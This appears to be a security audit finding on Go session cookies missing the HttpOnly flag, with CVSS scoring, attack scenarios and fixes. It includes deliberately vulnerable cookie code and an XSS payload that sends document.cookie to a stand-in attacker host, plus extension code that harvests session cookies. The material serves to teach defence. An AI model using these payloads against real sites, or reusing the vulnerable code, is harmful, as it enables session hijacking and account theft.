# Missing HttpOnly Flag in Session Cookies

# Vulnerability Case
During the security audit of Acme Corp's Go-based web application, our team discovered that session cookies issued by the authentication service were missing the `HttpOnly` flag. This vulnerability was identified by reviewing the source code handling cookies via Go's `net/http` package, where the flag was inadvertently omitted during cookie creation. The absence of the `HttpOnly` attribute allows client-side scripts to access sensitive session data, thereby substantially increasing the risk of cross-site scripting (XSS) exploitation. Given the critical role of the session token in user authentication, this misconfiguration could facilitate session hijacking and unauthorized access to user accounts in a production environment using a Linux-based server infrastructure behind NGINX.

```go
package main

import (
	"net/http"
)

func loginHandler(w http.ResponseWriter, r *http.Request) {
	// Assume generateToken() securely creates a session identifier.
	token, err := generateToken()
	if err != nil {
		http.Error(w, "Internal Server Error", http.StatusInternalServerError)
		return
	}

	cookie := &http.Cookie{
		Name:  "session_token",
		Value: token,
		// Vulnerability: HttpOnly flag is not set,
		// permitting client-side JavaScript to access the cookie.
		// HttpOnly: true, // This line should enforce the protection.
	}

	http.SetCookie(w, cookie)
	w.Write([]byte("Login successful"))
}
```

By omitting the `HttpOnly` flag, the session cookie becomes accessible via JavaScript, which, in the presence of an XSS vulnerability, enables attackers to steal session tokens and impersonate legitimate users. Exploitation could occur through malicious script injection within the application's front end, allowing an adversary to harvest session identifiers directly from the browser's `document.cookie`. This vulnerability is particularly damaging because session hijacking can lead to unauthorized data access, privilege escalation, and subsequent lateral movement within Acme Corp's network, thereby posing significant business risks and undermining overall application security.


context: go.lang.security.audit.net.cookie-missing-httponly.cookie-missing-httponly A session cookie was detected without setting the 'HttpOnly' flag. The 'HttpOnly' flag for cookies instructs the browser to forbid client-side scripts from reading the cookie which mitigates XSS attacks. Set the 'HttpOnly' flag by setting 'HttpOnly' to 'true' in the Cookie.

# Vulnerability Breakdown
This vulnerability involves the absence of the HttpOnly flag on session cookies in Acme Corp's Go-based web application, creating a significant security risk.

1. **Key vulnerability elements**:
   - Session cookies are created without the HttpOnly flag in the authentication service
   - Implemented in Go using the `net/http` package with the flag explicitly commented out
   - Running in a production environment on Linux servers behind NGINX
   - Affects the primary authentication mechanism protecting user accounts

2. **Potential attack vectors**:
   - Cross-site scripting (XSS) attacks that inject JavaScript to access cookies
   - Man-in-the-browser attacks through malicious browser extensions
   - Client-side malware that can access cookie storage
   - Supply chain attacks affecting client-side dependencies

3. **Severity assessment**:
   - Requires an additional vulnerability (usually XSS) for exploitation
   - Enables attackers to bypass authentication and hijack user sessions
   - Impacts confidentiality and integrity of user data
   - Requires user interaction with a compromised site/component

4. **CVSS v3.1 calculation**:
   - Attack Vector (AV): Network (N) 
   - Attack Complexity (AC): High (H) 
   - Privileges Required (PR): None (N) 
   - User Interaction (UI): Required (R) 
   - Scope (S): Unchanged (U)
   - Confidentiality (C): Low (L) 
   - Integrity (I): Low (L) 
   - Availability (A): None (N) 

# Description
A security vulnerability has been identified in Acme Corp's Go-based web application where session cookies issued by the authentication service are missing the `HttpOnly` flag. This was discovered during a code review, which found that the flag was specifically commented out in the cookie creation code.

```go
cookie := &http.Cookie{
    Name:  "session_token",
    Value: token,
    // Vulnerability: HttpOnly flag is not set
    // HttpOnly: true, // This line should enforce the protection.
}

```

When the `HttpOnly` flag is missing, client-side JavaScript can access the cookie's contents using `document.cookie`. This significantly increases the risk of session hijacking through Cross-Site Scripting (XSS) attacks, as malicious scripts can steal session tokens and transmit them to attacker-controlled servers. Once a session token is compromised, an attacker can impersonate the legitimate user, gaining unauthorized access to their account and potentially sensitive data or functionality.

# CVSS
**Score**: 4.2 \
**Vector**: CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:N \
**Severity**: Medium

The vulnerability receives a Medium severity rating (CVSS score: 4.2) based on the following factors:

- **Network Attack Vector (AV:N)**: The vulnerability is exploitable remotely over the internet, as the session cookies are transmitted to and accessible by client browsers.

- **High Attack Complexity (AC:H)**: Successful exploitation typically requires another vulnerability to exist (such as XSS) or special circumstances, increasing complexity. The attacker needs to both find an injection point and successfully execute malicious JavaScript in the victim's browser.

- **No Privileges Required (PR:N)**: An attacker doesn't need any authentication to exploit this vulnerability; they only need to find a way to execute JavaScript in the victim's browser context.

- **User Interaction Required (UI:R)**: The victim typically needs to interact with a malicious payload or visit a compromised page for the attack to succeed.

- **Unchanged Scope (S:U)**: The vulnerability does not cause an impact beyond the vulnerable component's security scope.

- **Low Confidentiality Impact (C:L)**: Session token theft could lead to unauthorized access to user information, but is typically limited to what that particular user can access.

- **Low Integrity Impact (I:L)**: An attacker could make unauthorized modifications through the hijacked session, but again limited to the victim user's permissions.

- **No Availability Impact (A:N)**: This vulnerability doesn't directly impact system availability.

The score reflects that while exploitation requires additional factors (like an XSS vulnerability), the potential consequences of session hijacking make this a significant security issue requiring prompt remediation.

# Exploitation Scenarios
**Scenario 1: Cross-Site Scripting + Session Hijacking**
An attacker discovers an XSS vulnerability in Acme Corp's web application, perhaps in a search function or comment system. They craft a payload that, when executed in a victim's browser, accesses the session cookie and transmits it to an attacker-controlled server:

```javascript
// Malicious script injected via XSS vulnerability
var stolenCookie = document.cookie;
fetch('https://attacker-server.com/collect?cookie=' + encodeURIComponent(stolenCookie));

```

When a victim with an active session encounters this XSS payload, their session token is automatically exfiltrated. The attacker can then use this token to impersonate the victim, gaining unauthorized access to their account without needing their password.

**Scenario 2: Malicious Browser Extension**
A user installs what appears to be a legitimate browser extension (e.g., a coupon finder or productivity tool). Unknown to the user, this extension contains malicious code that reads cookies from visited sites:

```javascript
// Code within malicious browser extension
browser.cookies.getAll({domain: "acmecorp.com"}, function(cookies) {
  cookies.forEach(function(cookie) {
    if(cookie.name === "session_token") {
      sendToAttacker(cookie.value);
    }
  });
});

```

Because the session cookie lacks the HttpOnly flag, the extension can access it and transmit it to the attacker, who can then perform session hijacking.

**Scenario 3: Man-in-the-Browser Attack**
A user's device is infected with malware that installs a malicious browser script. This script monitors for specific domains and extracts cookies whenever the user visits Acme Corp's application. Since the session cookie isn't protected with HttpOnly, the malware easily captures it and transmits it to the attacker, allowing them to hijack any authenticated session the victim establishes.

# Impact Analysis
**Business Impact:**
- Loss of user account security, potentially affecting customer trust and company reputation
- Unauthorized access to sensitive user data that could lead to privacy violations
- Potential legal and regulatory consequences if personal information is compromised
- Financial losses from remediation costs, potential fines, and damage control
- Possible need for forced session expiration and password resets across the platform

**Technical Impact:**
- Session hijacking enabling unauthorized access to user accounts without password credentials
- Ability for attackers to perform any actions available to compromised accounts
- Potential for lateral movement if administrative or privileged accounts are compromised
- Undermining of the authentication system even if password security is strong
- Creation of difficult-to-detect attacks since access appears to come from legitimate sessions
- Increased vulnerability to persistent XSS attacks by enabling session theft

# Technical Details
The vulnerability exists in the cookie creation code within the `loginHandler` function. In Go's `net/http` package, the `HttpOnly` flag must be explicitly set when creating cookies, but this security feature has been omitted:

```go
func loginHandler(w http.ResponseWriter, r *http.Request) {
    // Assume generateToken() securely creates a session identifier.
    token, err := generateToken()
    if err != nil {
        http.Error(w, "Internal Server Error", http.StatusInternalServerError)
        return
    }

    cookie := &http.Cookie{
        Name:  "session_token",
        Value: token,
        // Vulnerability: HttpOnly flag is not set,
        // permitting client-side JavaScript to access the cookie.
        // HttpOnly: true, // This line should enforce the protection.
    }

    http.SetCookie(w, cookie)
    w.Write([]byte("Login successful"))
}

```

The commented line `// HttpOnly: true,` indicates that the developer was aware of this security feature but failed to implement it. When a cookie lacks the HttpOnly flag, it becomes accessible to JavaScript via the `document.cookie` property in the browser.

Here's how an attacker would access these cookies through JavaScript:

```javascript
// This simple JavaScript can access all non-HttpOnly cookies
var cookies = document.cookie;
console.log(cookies);

// More targeted extraction of the session token
function getCookie(name) {
    const value = `; ${document.cookie}`;
    const parts = value.split(`; ${name}=`);
    if (parts.length === 2) return parts.pop().split(';').shift();
}
var sessionToken = getCookie("session_token");

```

This vulnerability is particularly concerning because:

1. Session tokens are high-value targets for attackers, as they provide direct account access
2. The exploitation requires only minimal JavaScript knowledge once an XSS vulnerability is found
3. The stolen session remains valid until it expires or is invalidated
4. Detection of session hijacking can be difficult as the requests come from a legitimate token

The root cause appears to be either developer oversight or a misunderstanding of web security best practices. The commented line suggests that the HttpOnly flag was considered but not implemented, possibly due to development needs (debugging) that were never properly addressed before deployment to production.

# Remediation Steps
## Enable HttpOnly Flag on Session Cookies

**Priority**: P0

Modify the cookie creation code to enable the HttpOnly flag for all session-related cookies:

```go
cookie := &http.Cookie{
    Name:     "session_token",
    Value:    token,
    Path:     "/",
    HttpOnly: true,  // Enable HttpOnly flag
}

```

This change ensures that JavaScript running in the browser cannot access the cookie's contents, mitigating the risk of cookie theft via XSS attacks. This is a simple, non-disruptive change that should be deployed immediately.
## Implement Additional Cookie Security Attributes

**Priority**: P1

Enhance cookie security by implementing additional protective attributes:

```go
cookie := &http.Cookie{
    Name:     "session_token",
    Value:    token,
    Path:     "/",
    Domain:   "acmecorp.com",       // Restrict to specific domain
    Expires:  time.Now().Add(1 * time.Hour), // Set appropriate expiration
    MaxAge:   3600,                 // 1 hour in seconds
    Secure:   true,                 // Ensure cookie is only sent over HTTPS
    HttpOnly: true,                 // Prevent JavaScript access
    SameSite: http.SameSiteStrictMode, // Mitigate CSRF attacks
}

```

These additional attributes provide defense-in-depth by:
1. Ensuring cookies are only transmitted over secure connections (Secure flag)
2. Preventing cross-site request forgery attacks (SameSite attribute)
3. Limiting the cookie's lifetime to reduce the impact of theft (Expires/MaxAge)
4. Restricting which domains receive the cookie (Domain attribute)


# References
* CWE-1004 | [Sensitive Cookie Without 'HttpOnly' Flag](https://cwe.mitre.org/data/definitions/1004.html)
* A05:2021 | [Security Misconfiguration](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/)
* A07:2021 | [Identification and Authentication Failures](https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/)
* CWE-79 | [Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')](https://cwe.mitre.org/data/definitions/79.html)
